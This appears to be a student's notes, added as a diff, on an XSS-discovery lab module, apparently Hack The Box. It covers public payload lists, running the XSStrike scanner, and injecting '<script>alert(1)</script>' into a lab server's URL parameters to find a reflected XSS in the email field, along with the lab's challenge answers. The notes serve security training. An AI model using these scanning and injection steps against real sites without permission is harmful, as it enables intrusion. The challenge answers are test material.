@@ -1,3 +1,47 @@
 
 The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on PayloadAllTheThings ( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md ) or the one in PayloadBox ( https://github.com/payloadbox/xss-payload-list ) . We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.
 
+Some of the common open-source tools that can assist us in XSS discovery are XSS Strike, Brute XSS, and XSSer. We can try XSS Strike by cloning it to our VM with git clone:
+
+SYNTAX: 
+
+MJBUCKNER@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
+MJBUCKNER@htb[/htb]$ cd XSStrike
+MJBUCKNER@htb[/htb]$ pip install -r requirements.txt
+MJBUCKNER@htb[/htb]$ python xsstrike.py
+
+XSStrike v3.1.4
+
+
+We can then run the script and provide it a URL with a parameter using -u. Let's try using it with our Reflected XSS example from the earlier section:
+
+SYNTAX: MJBUCKNER@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
+
+        XSStrike v3.1.4
+
+[~] Checking for DOM vulnerabilities 
+[+] WAF Status: Offline 
+[!] Testing parameter: task 
+[!] Reflections found: 1 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3072 
+------------------------------------------------------------
+[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
+[!] Efficiency: 100 
+[!] Confidence: 10 
+[?] Would you like to continue scanning? [y/N]
+
+
+
+CHALLENGE: 83.136.252.199:56047
+
+QUESTION 1 - Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?
+1) go to http://83.136.252.199:56047
+2) register an account, and look at the parameters in the URL -> http://83.136.252.199:56047/?fullname=test&username=teste&password=test&email=test%40test.com
+3) throw this in for parameters til it pops -> <script>alert(1)</script> 
+4) we find it for the email parameter -> http://83.136.252.199:56047/?fullname=test&username=teste&password=test&email=<script>alert(1)</script>
+
+
+QUESTION 2 - What type of XSS was found on the above server? "name only"
+1) reflected. 
